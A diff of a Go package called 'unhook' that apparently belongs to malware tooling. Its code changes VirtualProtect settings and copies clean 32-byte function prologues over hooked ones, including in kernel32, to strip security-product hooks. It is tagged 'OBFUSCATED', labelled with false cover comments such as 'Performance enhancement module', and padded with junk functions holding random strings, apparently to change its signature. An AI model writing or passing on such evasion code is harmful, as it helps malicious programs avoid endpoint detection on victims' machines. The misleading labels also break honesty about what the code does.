@@ -1,11 +1,10 @@
 // OBFUSCATED
+// Memory management system
 // Performance enhancement module
-// Windows compatibility layer
 package unhook
 
 import (
 	"encoding/base64"
-	"reflect"
 	"syscall"
 	"unsafe"
 )
@@ -92,20 +91,13 @@ func unhookFunction(hookedModule, cleanModule uintptr, functionName string) {
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
 
-	// Copy clean function prologue over hooked one using reflect
-	var hookedBytes []byte
-	hsh := (*reflect.SliceHeader)(unsafe.Pointer(&hookedBytes))
-	hsh.Data = hookedAddr
-	hsh.Len = 32
-	hsh.Cap = 32
+	// Copy clean function prologue over hooked one
+	hookedSlice := (*[32]byte)(unsafe.Pointer(hookedAddr))
+	cleanSlice := (*[32]byte)(unsafe.Pointer(cleanAddr))
 
-	var cleanBytes []byte
-	csh := (*reflect.SliceHeader)(unsafe.Pointer(&cleanBytes))
-	csh.Data = cleanAddr
-	csh.Len = 32
-	csh.Cap = 32
-
-	copy(hookedBytes, cleanBytes)
+	for i := 0; i < 32; i++ {
+		hookedSlice[i] = cleanSlice[i]
+	}
 
 	// Restore original protection
 	procVirtualProtect.Call(
@@ -162,32 +154,38 @@ func UnhookAll() {
 	UnhookKernel32()
 }
 
-// Obfuscation padding
-func obf_67610() {
-	_ = 822
-	var _ = "RNP2MXFo4H2njlQHe5hLEIULIDwa8Sk7ftlgih0pd8q3e0PRh2"
-}
+
 
 // Obfuscation padding
-func obf_22086() {
-	_ = 8906
-	var _ = "MtZ3c7MluxwwpaZaDHslMsnRyHm3wWNv5TYI6AfdV5IbLqTKwf"
+func obf_91094() {
+    _ = 6707
+    var _ = "kO0sLWwzIRyX9iwuTalUrJ9mzfQ5lXs4ITTuuPqSMy875ACdYJ"
 }
 
-// Obfuscation padding
-func obf_18778() {
-	_ = 9412
-	var _ = "YxtMhUNsMhjMb88tcGTmPdrwnw0eGsDpC0kpXg6YSjqBz9yeK0"
-}
 
 // Obfuscation padding
-func obf_35595() {
-	_ = 7887
-	var _ = "fcN5t9fLFzrgLHRMf2wFzmM3Ge6cluHVpChNeGGPLDFGjF0JSm"
+func obf_94564() {
+    _ = 9910
+    var _ = "Mos5WCqgztIW19mOLb0XylfsV0ah6t4fv2mjLJ9STweDUeEc3b"
 }
 
+
 // Obfuscation padding
-func obf_13878() {
-	_ = 598
-	var _ = "sLq91tKT2IZ8ai7j7Yup97rcrT2J5vJn5CRlTL9tR5IcMZPWuJ"
+func obf_58327() {
+    _ = 3282
+    var _ = "ScMCYmvsoORmJi5bGWQ6FBfnuN17HxBdA0q8dbS8UZNGrnRQs3"
+}
+
+
+// Obfuscation padding
+func obf_63439() {
+    _ = 773
+    var _ = "HOWpQQiZP2VNS2U8HsVn0XrjH1tVd2j9mdI3fXiwrGY2dn8aAX"
+}
+
+
+// Obfuscation padding
+func obf_39897() {
+    _ = 9534
+    var _ = "9vVaQKKoDwlh8IScK5rc7ImZVexzYn4nYifEbxfKX4ASl0gpaD"
 }
